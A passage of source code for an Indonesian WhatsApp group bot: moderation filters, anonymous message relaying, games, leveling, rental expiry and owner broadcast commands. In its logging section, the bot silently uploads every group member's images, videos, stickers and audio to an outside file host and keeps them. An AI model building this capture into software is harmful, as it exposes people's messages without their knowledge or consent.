for (let i = 0; i < groupMembers.length; i++) {
if (member[i].slice(0, 2) !== "62") {
let usersId = await groupMembers.find((u) => u.id == member[i])
if (!usersId.groupAdmins && !isOwner) {
} else
await sock.groupParticipantsUpdate(m.chat, [member[i]], "remove")
await sleep(1000)
}
}
}
//=========================[ FUNCTION ANTI TOXIC ]=========================\\
if (m.isGroup && isBotGroupAdmins && db.data.chats[m.chat].antitoxic) {
for (let x of bad) {
if (budy.toLowerCase().includes(x)) {
if (isOwner && m.key.fromMe && isGroupAdmins) return
setReply(mess.security.antitoxic.detect)
setTimeout(() => {
sock.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
}
//=========================[ FUNCTION ANTI SANGE ]=========================\\
if (m.isGroup && isBotGroupAdmins && db.data.chats[m.chat].antisange) {
for (let x of dosa) {
if (budy.toLowerCase().includes(x)) {
if (isOwner && m.key.fromMe && isGroupAdmins) return
setReply(mess.security.antisange.detect)
setTimeout(() => {
sock.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
}
//=========================[ FUNCTION ANTI VIRTEX ]=========================\\
if (m.isGroup && isBotGroupAdmins && db.data.chats[m.chat].antivirtex && budy.length > 20000) {
if (isOwner && m.key.fromMe && isGroupAdmins) return
setReply(mess.security.antivirtex.detect)
setTimeout(() => {
sock.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
//=========================[ FUNCTION ANTI NSFW ]=========================\\
if (m.isGroup && isBotGroupAdmins && db.data.chats[m.chat].antinsfw && isImage) {
if (isOwner && m.key.fromMe && isGroupAdmins) return
let media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
let anu = await TelegraPh(media)
let { data } = await axios.get(`https://api.lolhuman.xyz/api/nsfwcheck?apikey=${lolhumankey}&img=${anu}`)
if (Number(data.result.split("%")[0]) >= 50) {
setReply(mess.security.antinsfw.detect)
setTimeout(() => {
sock.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=========================[ FUNCTION ANTI TAG ]=========================\\
if (m.isGroup && isBotGroupAdmins && db.data.chats[m.chat].antitag) {
if (mentionByTag[0]) {
if (isOwner && m.key.fromMe && isGroupAdmins) return
setReply(mess.security.antitag.detect)
setTimeout(() => {
sock.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=========================[ FUNCTION ANTI LINK TWITTER ]=========================\\
if (m.isGroup && isBotGroupAdmins && db.data.chats[m.chat].antilinktwitter) {
if (budy.includes("https://twitter.com/")) {
if (isOwner && m.key.fromMe && isGroupAdmins) return
if (budy.includes("zin admin") || budy.includes("zinmin")) return setReply(mess.security.izin)
setReply(mess.security.antilinktwitter.detect)
setTimeout(() => {
sock.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}, 2000)
}
}
//=========================[ DETECT AFK USERS ]=========================\\
if (m.isGroup && sock.checkDataId("afk", Input, dataId)) {
setReply(mess.security.afk.detect)        
}        
if (m.isGroup && sock.checkDataId("afk", m.sender, dataId)) {
sock.removeDataId("afk", m.sender, dataId)
setReply(mess.security.afk.done)
}
//=========================[ AUTO RESPON VOICE MESSAGE ]=========================\\
if (db.data.audio[budy]) {
if (sock.cekSpam("NotCase", m.sender.split("@")[0], antispam)) return
sock.addSpam("NotCase", m.sender.split("@")[0], "5s", antispam)
sock.sendMessage(m.chat, { audio: { url: db.data.audio[budy].url }, mimetype: "audio/mp4", ptt: true }, { quoted: setQuoted })
}
if (db.data.sticker[budy]) {
if (sock.cekSpam("NotCase", m.sender.split("@")[0], antispam)) return
sock.addSpam("NotCase", m.sender.split("@")[0], "5s", antispam)
sock.sendMessage(m.chat, { sticker: { url: db.data.sticker[budy].url }}, { quoted: setQuoted })
}
//=========================[ AUTO RESPON MESSAGE ]=========================\\
if (!m.isGroup && !isCmd && !m.key.fromMe && db.data.settings[botNumber].autorespon && !isSticker && !isAudio && !isMedia) {
try{
let randomText = ["Ara Ara Kak","Iy Kak","Ada apa kak","🗿","🐦","Afa iy","Apa","Oh","Ok"]
let simiV2 = sock.pickRandom(randomText)
let { data } = await axios.get(`https://api.simsimi.net/v2/?text=${encodeURI(budy)}&lc=id`)
let sami = data.success
let simi = sock.pickRandom([sami, simiV2, budy]) 
sock.sendMessage(m.chat, { text: simi }, { quoted: setQuoted }) 
} catch (e) {
console.log(e) 
}
}
//=========================[ FUNCTION AUTO LEVEL ]=========================\\
if (!m.key.fromMe && isCmd) {
try {
if (db.data.settings[botNumber].autolevel) {
db.data.users[m.sender].xp += amountExp
}
if ((db.data.settings[botNumber].autolevel && userExp >= requiredExp) || (db.data.settings[botNumber].autolevel && userExp == requiredExp)) {
db.data.users[m.sender].level += 1
db.data.users[m.sender].xp += userExp
db.data.users[m.sender].balance += 1000
if (userLevel >= 25) {
var sapi = Math.ceil(Math.random() * userLevel)
db.data.users[m.sender].limit += sapi
} else {
var sapi = 0
}
let teks = `\`\`\`「  LEVEL UP  」\`\`\`

▸ Name : ${m.pushName}
▸ User : @${m.sender.split("@")[0]}
▸ Saldo : Rp ${susu}
▸ Limit : ${sapi}
▸ Level : ${sock.userLeveling(userLevel + 1)}
▸ Clock : ${timeWib}
`
setReply(teks) 
}
} catch (e) {
console.error(e)
}
}
//=========================[ SECURITY BOT ]=========================\\
if (sock.checkDataId("blockcmd", command, dataId)) {
if (m.isGroup && !isSewa) return onlySewa()
return setReply(mess.security.blockcmd.detect(command))
}
if (sock.checkDataId("owner", command, dataId)) {
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
}
if (sock.checkDataId("premium", command, dataId)) {
if (m.isGroup && !isSewa) return onlySewa()
if (!isPremium && !m.key.fromMe) return onlyPrem()
}
if (sock.checkDataId("limit", command, dataId)) {
if (m.isGroup && !isSewa) return onlySewa()
if (isPremium) {
onlyWait() 
} else {
if (db.data.users[m.sender].limit < 1) return onlyLimit()
db.data.users[m.sender].limit -= 1
{let ko = await sock.sendMessage(m.chat, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${db.data.users[m.sender].limit}` }, { quoted: setQuoted })
setTimeout(() => m.delete(ko), 2500)
let kon = await sock.sendMessage(m.chat, { text: mess.wait }, { quoted: setQuoted })
setTimeout(() => m.delete(kon), 3000)}
}
}
//=========================[ FUNCTION ADD LIMIT ]=========================\\
if (db.data.database.addlimit.status && budy && !isNaN(budy)) {
if (!isOwner && !m.key.fromMe) return
let data = db.data.database.addlimit.number
setTimeout(() => {
db.data.database.addlimit = {
status: false, 
number: ""
}
}, 2000)
setTimeout(() => {
setReply(mess.cmd.addlimit.text2(budy, data)) 
}, 1000) 
db.data.users[data].limit += Number(body)
}
//=========================[ FUNCTION MENFES PENGIRIM ]=========================\\
if (sock.cekPengirimMenfes(m.sender, menfes)) {
if (sock.getChatPengirimMenfes(m.sender, menfes) && isText && !isCmd && !m.isGroup) {
await sock.sendMessageV2(sock.getIdPenerimaMenfes(m.sender, menfes), {contextInfo: { externalAdReply: { showAdAttribution: true, title: db.data.settings[botNumber].namabot, body: "DONT CLICK HERE", previewType: "PHOTO", thumbnail: kfrply, sourceUrl: `https://wa.me/${ownerNumber}?text=${db.data.settings[botNumber].textreply}` } }, text: body })
} else if (sock.getChatPengirimMenfes(m.sender, menfes) && isImage && !isCmd && !m.isGroup) {
let media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
await sock.sendMessage(sock.getIdPenerimaMenfes(m.sender, menfes), { image: media, caption: body})
} else if (sock.getChatPengirimMenfes(m.sender, menfes) && isVideo && !isCmd && !m.isGroup) {
let media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
await sock.sendMessage(sock.getIdPenerimaMenfes(m.sender, menfes), { video: media, caption: body})
} else if (sock.getChatPengirimMenfes(m.sender, menfes) && isSticker && !isCmd && !m.isGroup) {
let media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
await sock.sendMessage(sock.getIdPenerimaMenfes(m.sender, menfes), { sticker: media}) 
} else if (sock.getChatPengirimMenfes(m.sender, menfes) && isAudio && !isCmd && !m.isGroup) {
let media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
await sock.sendMessage(sock.getIdPenerimaMenfes(m.sender, menfes), { audio: media, mimetype: "audio/mp4", ptt: true }) 
}
}
//=========================[ FUNCTION MENFES PENERIMA ]=========================\\
if (sock.cekPenerimaMenfes(m.sender, menfes)) {
if (sock.getChatPenerimaMenfes(m.sender, menfes) && isText && !isCmd && !m.isGroup) {
await sock.sendMessageV2(sock.getIdPengirimMenfes(m.sender, menfes), {contextInfo: { externalAdReply: { showAdAttribution: true, title: db.data.settings[botNumber].namabot, body: "DONT CLICK HERE", previewType: "PHOTO", thumbnail: kfrply, sourceUrl: `https://wa.me/${ownerNumber}?text=${db.data.settings[botNumber].textreply}` } }, text: body })
} else if (sock.getChatPenerimaMenfes(m.sender, menfes) && !isCmd && isImage && !m.isGroup) {
let media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
await sock.sendMessage(sock.getIdPengirimMenfes(m.sender, menfes), { image: media, caption: body})
} else if (sock.getChatPenerimaMenfes(m.sender, menfes) && isVideo && !isCmd && !m.isGroup) {
let media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
await sock.sendMessage(sock.getIdPengirimMenfes(m.sender, menfes), { video: media, caption: body})
} else if (sock.getChatPenerimaMenfes(m.sender, menfes) && isSticker && !isCmd && !m.isGroup) {
let media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
await sock.sendMessage(sock.getIdPengirimMenfes(m.sender, menfes), { sticker: media}) 
} else if (sock.getChatPenerimaMenfes(m.sender, menfes) && isAudio && !isCmd && !m.isGroup) {
let media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
await sock.sendMessage(sock.getIdPengirimMenfes(m.sender, menfes), { audio: media, mimetype: "audio/mp4", ptt: true }) 
} 
}
//=========================[ EXPIRED CHECK ]=========================\\
if (Object.keys(db.data.expired[botNumber].owner).length > 0) {
let data = Object.keys(db.data.expired[botNumber].owner)
let button = [{ buttonId: `${prefix}owner`, buttonText: { displayText: "ᴏᴡɴᴇʀ" }, type: "RESPONSE" }]
for (let x of data) {
if (Date.now() >= db.data.expired[botNumber].owner[x].expired) {
setTimeout(() => {
delete db.data.expired[botNumber].owner[x]
}, 1000)
sock.sendButLoc(x, mess.expired.owner, copyrightnya, gfrply, button)
}}}
if (Object.keys(db.data.expired[botNumber].premium).length > 0) {
let data = Object.keys(db.data.expired[botNumber].premium)
let button = [{ buttonId: `${prefix}owner`, buttonText: { displayText: "ᴏᴡɴᴇʀ" }, type: "RESPONSE" }]
for (let x of data) {
if (Date.now() >= db.data.expired[botNumber].premium[x].expired) {
setTimeout(() => {
delete db.data.expired[botNumber].premium[x]
}, 1000)
sock.sendButLoc(x, mess.expired.premium, copyrightnya, gfrply, button)
}}}
if (Object.keys(db.data.expired[botNumber].sewa).length > 0) {
let data = Object.keys(db.data.expired[botNumber].sewa)
let button = [{ buttonId: `${prefix}owner`, buttonText: { displayText: "ᴏᴡɴᴇʀ" }, type: "RESPONSE" }]
for (let x of data) {
if (Date.now() >= db.data.expired[botNumber].sewa[x].expired) {
setTimeout(() => {
delete db.data.expired[botNumber].sewa[x]
}, 2000)
setTimeout(() => {
sock.groupLeave(x)
}, 1000)
sock.sendButLoc(x, mess.expired.sewa, copyrightnya, gfrply, button)
}}} else if (m.isGroup && db.data.chats[m.chat].sewa.status) {
let button = [{ buttonId: `${prefix}owner`, buttonText: { displayText: "ᴏᴡɴᴇʀ" }, type: "RESPONSE" }]
if (Date.now() >= db.data.chats[m.chat].sewa.expired) {
setTimeout(() => {
db.data.chats[m.chat].sewa = {
status: false,
date: calender, 
expired: 0
}
}, 2000)
setTimeout(() => {
sock.groupLeave(m.chat)
}, 1000)
sock.sendButLoc(x, mess.expired.sewa, copyrightnya, gfrply, button)
}}
//=========================[ FUNCTION GAME CAKLONTONG ]=========================\\
if (db.data.users[m.sender].game.caklontong.status) {
if (budy == db.data.users[m.sender].game.caklontong.jawaban) {
setTimeout(() => {
setReply(mess.security.game.text1) 
}, 1000)
setTimeout(() => {
db.data.users[m.sender].balance += 5000
db.data.users[m.sender].game.caklontong = {
status: false,
expired: 0,
pertanyaan: "", 
jawaban: ""
}
}, 2000)
} else if (Date.now() >= db.data.users[m.sender].game.caklontong.expired) {
setTimeout(() => {
setReply(mess.security.game.text2(db.data.users[m.sender].game.caklontong.jawaban))
}, 1000)
setTimeout(() => {
db.data.users[m.sender].game.caklontong = {
status: false,
expired: 0,
pertanyaan: "", 
jawaban: ""
}
}, 2000)
}
}
//=========================[ FUNCTION GAME FAMILY 100 ]=========================\\
if (db.data.users[m.sender].game.family100.status) {
if (db.data.users[m.sender].game.family100.jawaban.includes(budy)) {
setTimeout(() => {
setReply(mess.security.game.text1) 
}, 1000)
setTimeout(() => {
db.data.users[m.sender].balance += 5000
db.data.users[m.sender].game.family100 = {
status: false,
expired: 0,
pertanyaan: "", 
jawaban: ""
}
}, 2000)
} else if (Date.now() >= db.data.users[m.sender].game.family100.expired) {
setTimeout(() => {
setReply(mess.security.game.text2(db.data.users[m.sender].game.family100.jawaban))
}, 1000)
setTimeout(() => {
db.data.users[m.sender].game.family100 = {
status: false,
expired: 0,
pertanyaan: "", 
jawaban: ""
}
}, 2000)
}
}
//=========================[ FUNCTION GAME SIAPA AKU ]=========================\\
if (db.data.users[m.sender].game.siapaaku.status) {
if (budy == db.data.users[m.sender].game.siapaaku.jawaban) {
setTimeout(() => {
setReply(mess.security.game.text1) 
}, 1000)
setTimeout(() => {
db.data.users[m.sender].balance += 5000
db.data.users[m.sender].game.siapaaku = {
status: false,
expired: 0,
pertanyaan: "", 
jawaban: ""
}
}, 2000)
} else if (Date.now() >= db.data.users[m.sender].game.siapaaku.expired) {
setTimeout(() => {
setReply(mess.security.game.text2(db.data.users[m.sender].game.siapaaku.jawaban))
}, 1000)
setTimeout(() => {
db.data.users[m.sender].game.siapaaku = {
status: false,
expired: 0,
pertanyaan: "", 
jawaban: ""
}
}, 2000)
}
}
//=========================[ FUNCTION GAME SUSUN KATA ]=========================\\
if (db.data.users[m.sender].game.susunkata.status) {
if (budy == db.data.users[m.sender].game.susunkata.jawaban) {
setTimeout(() => {
setReply(mess.security.game.text1) 
}, 1000)
setTimeout(() => {
db.data.users[m.sender].balance += 5000
db.data.users[m.sender].game.susunkata = {
status: false,
expired: 0,
pertanyaan: "", 
jawaban: ""
}
}, 2000)
} else if (Date.now() >= db.data.users[m.sender].game.susunkata.expired) {
setTimeout(() => {
setReply(mess.security.game.text2(db.data.users[m.sender].game.susunkata.jawaban))
}, 1000)
setTimeout(() => {
db.data.users[m.sender].game.susunkata = {
status: false,
expired: 0,
pertanyaan: "", 
jawaban: ""
}
}, 2000)
}
}
//=========================[ FUNCTION GAME TEBAK BENDERA ]=========================\\
if (db.data.users[m.sender].game.tebakbendera.status) {
if (budy == db.data.users[m.sender].game.tebakbendera.jawaban) {
setTimeout(() => {
setReply(mess.security.game.text1) 
}, 1000)
setTimeout(() => {
db.data.users[m.sender].balance += 5000
db.data.users[m.sender].game.tebakbendera = {
status: false,
expired: 0,
pertanyaan: "", 
jawaban: ""
}
}, 2000)
} else if (Date.now() >= db.data.users[m.sender].game.tebakbendera.expired) {
setTimeout(() => {
setReply(mess.security.game.text2(db.data.users[m.sender].game.tebakbendera.jawaban))
}, 1000)
setTimeout(() => {
db.data.users[m.sender].game.tebakbendera = {
status: false,
expired: 0,
pertanyaan: "", 
jawaban: ""
}
}, 2000)
}
}
//=========================[ FUNCTION GAME TEBAK GAMBAR ]=========================\\
if (db.data.users[m.sender].game.tebakgambar.status) {
if (budy == db.data.users[m.sender].game.tebakgambar.jawaban) {
setTimeout(() => {
setReply(mess.security.game.text1) 
}, 1000)
setTimeout(() => {
db.data.users[m.sender].balance += 5000
db.data.users[m.sender].game.tebakgambar = {
status: false,
expired: 0,
pertanyaan: "", 
jawaban: ""
}
}, 2000)
} else if (Date.now() >= db.data.users[m.sender].game.tebakgambar.expired) {
setTimeout(() => {
setReply(mess.security.game.text2(db.data.users[m.sender].game.tebakgambar.jawaban))
}, 1000)
setTimeout(() => {
db.data.users[m.sender].game.tebakgambar = {
status: false,
expired: 0,
pertanyaan: "", 
jawaban: ""
}
}, 2000)
}
}
//=========================[ FUNCTION GAME TEBAK KATA ]=========================\\
if (db.data.users[m.sender].game.tebakkata.status) {
if (budy == db.data.users[m.sender].game.tebakkata.jawaban) {
setTimeout(() => {
setReply(mess.security.game.text1) 
}, 1000)
setTimeout(() => {
db.data.users[m.sender].balance += 5000
db.data.users[m.sender].game.tebakkata = {
status: false,
expired: 0,
pertanyaan: "", 
jawaban: ""
}
}, 2000)
} else if (Date.now() >= db.data.users[m.sender].game.tebakkata.expired) {
setTimeout(() => {
setReply(mess.security.game.text2(db.data.users[m.sender].game.tebakkata.jawaban))
}, 1000)
setTimeout(() => {
db.data.users[m.sender].game.tebakkata = {
status: false,
expired: 0,
pertanyaan: "", 
jawaban: ""
}
}, 2000)
}
}
//=========================[ FUNCTION GAME TEBAK LIRIK ]=========================\\
if (db.data.users[m.sender].game.tebaklirik.status) {
if (budy == db.data.users[m.sender].game.tebaklirik.jawaban) {
setTimeout(() => {
setReply(mess.security.game.text1) 
}, 1000)
setTimeout(() => {
db.data.users[m.sender].balance += 5000
db.data.users[m.sender].game.tebaklirik = {
status: false,
expired: 0,
pertanyaan: "", 
jawaban: ""
}
}, 2000)
} else if (Date.now() >= db.data.users[m.sender].game.tebaklirik.expired) {
setTimeout(() => {
setReply(mess.security.game.text2(db.data.users[m.sender].game.tebaklirik.jawaban))
}, 1000)
setTimeout(() => {
db.data.users[m.sender].game.tebaklirik = {
status: false,
expired: 0,
pertanyaan: "", 
jawaban: ""
}
}, 2000)
}
}
//=========================[ FUNCTION GAME TEBAK JENAKA ]=========================\\
if (db.data.users[m.sender].game.tebakjenaka.status) {
if (budy == db.data.users[m.sender].game.tebakjenaka.jawaban) {
setTimeout(() => {
setReply(mess.security.game.text1) 
}, 1000)
setTimeout(() => {
db.data.users[m.sender].balance += 5000
db.data.users[m.sender].game.tebakjenaka = {
status: false,
expired: 0,
pertanyaan: "", 
jawaban: ""
}
}, 2000)
} else if (Date.now() >= db.data.users[m.sender].game.tebakjenaka.expired) {
setTimeout(() => {
setReply(mess.security.game.text2(db.data.users[m.sender].game.tebakjenaka.jawaban))
}, 1000)
setTimeout(() => {
db.data.users[m.sender].game.tebakjenaka = {
status: false,
expired: 0,
pertanyaan: "", 
jawaban: ""
}
}, 2000)
}
}
//=========================[ MESSAGE LOG ]=========================\\
if (!m.isGroup && isCmd) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color(`${command} [${args.length}]`, "cyan"), color("from", "gold"), color(`${m.pushName}`, "orange"))
}
if (m.isGroup && isCmd) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color(`${command} [${args.length}]`, "cyan"), color("from", "gold"), color(`${m.pushName}`, "orange"), color("in", "purple"), color(groupName, "deeppink"))
}
if (!m.isGroup && isText) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mPRIVATE\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color(budy, "cyan"), color("from", "gold"), color(`${m.pushName}`, "orange"))
}
if (!m.isGroup && isImage) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mIMAGE\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color("Image message detect", "cyan"), color("from", "gold"), color(`${m.pushName}`, "orange"))
}
if (!m.isGroup && isVideo) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mVIDEO\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color("Video message detect", "cyan"), color("from", "gold"), color(`${m.pushName}`, "orange"))
}
if (!m.isGroup && isSticker) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mSTICKER\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color("Sticker message detect", "cyan"), color("from", "gold"), color(`${m.pushName}`, "orange"))
}
if (!m.isGroup && isAudio) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mAUDIO\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color("Audio message detect", "cyan"), color("from", "gold"), color(`${m.pushName}`, "orange"))
}
if (!m.isGroup && isViewOnce) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mVIEW ONCE\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color("View once message detect", "cyan"), color("from", "gold"), color(`${m.pushName}`, "orange"))
}
if (m.isGroup && isViewOnce) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mVIEW ONCE\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color("View once message detect", "cyan"), color("from", "gold"), color(`${m.pushName}`, "orange"), color("in", "purple"), color(groupName, "deeppink"))
}
if (m.isGroup && isText) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mGROUP\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color(budy, "cyan"), color("from", "gold"), color(`${m.pushName}`, "orange"), color("in", "purple"), color(groupName, "deeppink"))
db.data.users[m.sender].delete = {
type: m.type, 
text: body,
url: "", 
}
}
if (m.isGroup && isImage) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mIMAGE\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color("Image message detect", "cyan"), color("from", "gold"), color(`${m.pushName}`, "orange"), color("in", "purple"), color(groupName, "deeppink"))
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const anu = await UploadFileUgu(media)
db.data.users[m.sender].delete = {
type: m.type, 
text: body,
url: anu.url, 
}
}
if (m.isGroup && isVideo) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mVIDEO\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color("Video message detect", "cyan"), color("from", "gold"), color(`${m.pushName}`, "orange"), color("in", "purple"), color(groupName, "deeppink"))
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const anu = await UploadFileUgu(media)
db.data.users[m.sender].delete = {
type: m.type, 
text: body,
url: anu.url, 
}
}
if (m.isGroup && isSticker) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mSTICKER\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color("Sticker message detect", "cyan"), color("from", "gold"), color(`${m.pushName}`, "orange"), color("in", "purple"), color(groupName, "deeppink"))
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const anu = await UploadFileUgu(media)
db.data.users[m.sender].delete = {
type: m.type, 
text: "",
url: anu.url, 
}
}
if (m.isGroup && isAudio) {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mAUDIO\x1b[1;37m]"), color(moment.tz("Asia/Jakarta").format("HH:mm"), "green"), color("Audio message detect", "cyan"), color("from", "gold"), color(`${m.pushName}`, "orange"), color("in", "purple"), color(groupName, "deeppink"))
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const anu = await UploadFileUgu(media)
db.data.users[m.sender].delete = {
type: m.type, 
text: "",
url: anu.url, 
}
}
//=========================[ CASE BOT ]=========================\\
if (isCmd) sock.Succes(command, dash, allcommand)
try{
switch (command) {
//=========================[ FITURE OWNER ]=========================\\
case "join":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!text) return setReply(mess.query.link)
if (!text.includes("https://chat.whatsapp.com/")) return setReply(mess.cmd.join.linkgc)
let ano = text.split("https://chat.whatsapp.com/")[1]
await sock.groupAcceptInvite(ano)
setReply(mess.success)
}
break
case "leave":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isOwner && !m.key.fromMe) return onlyOwner()
await sock.groupLeave(m.chat)
break
case "creategc":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!text) return setReply(mess.query.text)
let cret = await sock.groupCreate(text, [])
let response = await sock.groupInviteCode(cret.id)
let teks = `\`\`\`「  CREATION GROUP MESSAGE  」\`\`\`

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
▸ Link : https://chat.whatsapp.com/${response}
`
setTimeout(() => {
setReply(teks) 
}, 7000)
setTimeout(() => {
sock.groupParticipantsUpdate(cret.id, [m.sender], "promote")
}, 5000)
setTimeout(() => {
sock.groupParticipantsUpdate(cret.id, [m.sender], "add")
}, 1000)
}
break
case "bc":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
let data = await store.chats.all()
if (isImage || isQuotedImage) {
if (!text) return setReply(mess.query.text)
let teks = `\`\`\`「  BROADCAST MESSAGE  」\`\`\`\n\n${text}`
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
for (let x of data) {
await sock.sendMessage(x.id, { contextInfo: { forwardingScore: 10, isForwarded: true }, image: { url: media }, caption: teks, footer: copyrightnya })
await sleep(1000)
} 
} else if (isVideo || isQuotedVideo) {
if (!text) return setReply(mess.query.text)
let teks = `\`\`\`「  BROADCAST MESSAGE  」\`\`\`\n\n${text}`
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
for (let x of data) {
await sock.sendMessage(x.id, { contextInfo: { forwardingScore: 10, isForwarded: true }, video: { url: media }, caption: teks, footer: copyrightnya })
await sleep(1000)
}
} else if (isQuotedSticker) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
for (let x of data) {
await sock.sendMessage(x.id, { sticker: { url: media }})
await sleep(1000)
}
} else if (isQuotedAudio) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
for (let x of data) {
await sock.sendMessage(x.id, { contextInfo: { forwardingScore: 10, isForwarded: true }, audio: { url: media }, mimetype: "audio/mp4", ptt: true })
await sleep(1000)
}
} else if (isQuotedContact) {
let vcard = []
for (let z of m.quoted.contacts) {
vcard.push({ vcard: z.vcard }) 
}
for (let x of data) {
await sock.sendKontakV2(x.id, vcard, setQuoted) 
}
await sleep(1000)
} else if (!isAllMedia && !isQuotedAllMedia) {
if (!text) return setReply(mess.query.text)
let teks = `\`\`\`「  BROADCAST MESSAGE  」\`\`\`\n\n${text}`
for (let x of data) {
await sock.sendMessage(x.id, { contextInfo: { forwardingScore: 10, isForwarded: true }, text: teks })
await sleep(1000)
}
}
setReply(mess.cmd.bc.text(data))
}
break
case "bcgc":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
let getGroups = await sock.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let data = groupss.map((v) => v.id)
if (isImage || isQuotedImage) {
if (!text) return setReply(mess.query.text)
let teks = `\`\`\`「  BROADCAST GROUP  」\`\`\`\n\n${text}`
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
for (let x of data) {
await sock.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: true }, image: { url: media }, caption: teks, footer: copyrightnya })
await sleep(1000)
} 
} else if (isVideo || isQuotedVideo) {
if (!text) return setReply(mess.query.text)
let teks = `\`\`\`「  BROADCAST GROUP  」\`\`\`\n\n${text}`
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
for (let x of data) {
await sock.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: true }, video: { url: media }, caption: teks, footer: copyrightnya })
await sleep(1000)
}
} else if (isQuotedSticker) {
